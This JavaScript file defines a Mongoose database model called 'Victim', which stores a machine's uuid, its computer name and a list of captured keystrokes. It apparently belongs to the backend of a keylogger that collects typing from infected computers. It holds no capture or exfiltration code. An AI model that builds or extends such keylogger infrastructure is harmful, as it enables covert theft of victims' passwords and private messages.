const mongoose = require("mongoose");
const { KeystrokeSchema } = require("./Keystroke");

const VictimSchema = mongoose.Schema({
    uuid: {
        type: String,
        required: true
    },
    computerName: {
        type: String,
        required: true
    },
    added: {
        type: Date,
        default: Date.now
    },
    keystrokes: [KeystrokeSchema]
})

module.exports = mongoose.model("Victim", VictimSchema);